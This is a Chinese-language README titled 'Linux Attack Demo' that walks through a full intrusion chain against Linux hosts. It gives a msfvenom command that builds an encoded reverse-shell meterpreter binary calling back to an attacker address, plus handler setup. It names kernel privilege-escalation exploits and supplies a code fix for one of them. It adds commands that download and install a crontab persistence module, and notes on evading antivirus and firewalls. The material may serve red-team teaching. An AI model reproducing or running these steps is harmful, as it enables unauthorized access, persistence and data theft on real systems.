## Linux Attack Demo说明与操作

#### 一. 工具与依赖 

1. **系统**

   - Kali Linux, Parrot Linux, 其他Linux发行版也可。

2. **工具**

   - Exploit, Payload & Backdoor
   > [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
   > [TheFatRat](https://github.com/Screetsec/TheFatRat)
   > [Veil](https://github.com/Veil-Framework/Veil)
   > [Azazel](https://github.com/chokepoint/azazel)
   
   -  Privilege Escalation
   > [Dirtycow](https://github.com/gbonacini/CVE-2016-5195)  (Linux kernel>2.6.22 (released in 2007), centos7.2, ubuntu 14.04)
	> [overlayfs](https://www.exploit-db.com/exploits/37292) (Linux kernel3.13-3.19、4.33， ubuntu14.04)
   > [Setuid 'ptrace_scope'](https://www.exploit-db.com/exploits/46989) (centos7.6)

   *  Persistence
   >[crontab](https://github.com/r00t-3xp10it/msf-auxiliarys/wiki/Linux-Persistence-%5Bpost-exploitation%5D)

#### 二. 攻击流程
![攻击流程图](https://raw.githubusercontent.com/songnezha/pictures/master/linux attack.jpg)

  1. **Gaining Access** 
	
	>- 省略ip扫描、端口扫描和嗅探等操作，默认已经获得目标端主机信息。
	>- 通过两种方式对目标端其进行Exploit，一是利用目标主机系统或软件中的backdoor，二是通过社会工程学在目标端上放置内有payload的文件或程序。
	>- 当有以上措施后，可在攻击端监听，利用backdoor或payload返回reverse shell.
	>- 制作payload的工具有msfvenom, TheFatRat, Veil-Evasion(windows)，其中Veil-Evasion制作的payload在测试中可以bypass所有Antivirus。
	>
	>```c
	>  //msfvenom
	>  msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 lhost 192.168.1.1 lport 4444 -f elf > exploit.elf
	>  
	>  //metasploit 
	>  use exploit/multi/handler
	>  set payload linux/x64/meterpreter/reverse_tcp
	>  set lhost 192.168.1.1
	>  set lport 4444
	>  exploit //get reverse meterpreter shell
	>  ```
	>  
	
2. **C&C**
	
	>- Remote File Copy
	>   
	>   - scp
	>	- rsync
	>	- sftp
	>- Commonly Used Port
    >	- 攻击端利用常用端口进行通信，以绕过防火墙或网络检测系统，并通过与正常的网络活动相结合来避免更详细的检测。
   >     >TCP：80（HTTP）
   >     >TCP：443（HTTPS）
   >     >TCP：25（SMTP）
   >     >TCP / UDP：53（DNS）

3. **Lateral Movement**

   > - Remote File Copy

4. **Privilege Escalation**

   > - Kernel Exploits
   > 	- Dirtycow：利用Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在的条件竞争漏洞破坏私有只读内存映射，造成可以重写/etc/passwd，从而改变root用户名和密码。上面的github代码中存在持久化漏洞，需在120-121行间添加：
   > 	
   > 	  ```cpp
   > 	  //between line 120 and 121
   > 	  close(fpsm);
   > 	  ```
   > 	
   > 	- overlayfs：利用ubuntu在上层文件系统目录中创建新文件时没有正确检查文件权限，使用户拥有管理员权限。
   > 	
   > 	- Setuid 'ptrace_scope'：利用Linux系统中sudo的实效性，通过ptrace和gdb实现对其他shell的注入，对/bin/bash拷贝的副本进行chmod +s 操作，并由此启动一个root shell，，使原shell获得root权限。
   
5. **Defence Evasion**

   > - process injection
   >   - meterpreter migrate 'id'

6. **Persistence**

   > - Local Job Scheduling
   >
   >   - crontab
   >
   >     ```c
   >       //download metasploit post-module
   >       wget https://raw.githubusercontent.com/r00t-3xp10it/msf-auxiliarys/master/linux/kali_initd_persistence.rb
   >       
   >       //copy module to metasploit database
   >       path=$(locate modules/post/linux/manage | grep -v '\doc' | grep -v '\documentation' | head -n 1)
   >       sudo cp kali_initd_persistence.rb $path/kali_initd_persistence.rb
   >       
   >       //start postgresql
   >       sudo service postgresql start
   >       
   >       //rebuild msfdb database
   >       sudo msfdb reinit
   >       
   >       //reload kali_initd_persistence into msfdb
   >       sudo msfconsole -x 'db_status;reload_all;exit -y'
   >       
   >       //start multi-handler to recive the connection......
   >       
   >       //load post-module and config it
   >       meterpreter > background
   >       msf5 exploit(multi/handler) > search initd
   >       msf5 exploit(multi/handler) > use post/linux/manage/kali_initd_persistence
   >       msf5 post(linux/manage/kali_initd_persistence) > info
	>       msf5 post(linux/manage/kali_initd_persistence) > show advanced
   >       msf5 post(linux/manage/kali_initd_persistence) > set CRONTAB true
   >       msf5 post(linux/manage/kali_initd_persistence) > set REMOTE_PATH 'payload'
   >       msf5 post(linux/manage/kali_initd_persistence) > show advanced options
   >       msf5 post(linux/manage/kali_initd_persistence) > exploit
   >     ```
   >
   > - systemd service
   >   
   >   - 攻击者通过使用systemd创建或修改service文件，从而建立对目标端的持久访问，这些文件使systemd以重复的间隔执行恶意命令，如在系统启动时。
   
7. **Pilfering（Collection）**

   > - Data from Local System/Network Shared Drive
   >
   > - Audio/Video/Screen/Input Capture
   
8. **Exfiltration**

   > - Data Compressed
   > - Data Encrypted

   
